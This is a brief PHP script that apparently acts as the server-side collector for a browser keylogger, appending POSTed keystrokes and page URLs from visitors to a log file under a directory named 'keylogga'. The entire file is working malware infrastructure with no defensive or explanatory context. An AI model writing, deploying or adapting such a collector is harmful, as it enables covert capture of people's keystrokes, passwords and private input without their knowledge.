<?php
#To keep track of the user's sites so it will keep track of the change in pages
session_start();

#Authenticate person connecting by checking if value key is set
if (!isset($_POST['key'])) {
        echo("NO ENTRY!!");
        exit(0);
}

#Open key.log, create if doesnt exist
$file = fopen("/var/www/html/keylogga/key.log","a+");

#Check if user is on the same page. Will update when user is on a different page.
#Write url of page to file.
if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
        $_SESSION['page'] = $_POST['page'];
        fwrite($file," [ PAGE : ".$_POST['page']."] ");
}
#Write keystrokes of user on that page
fwrite($file,$_POST['key']);

fclose($file);

?>
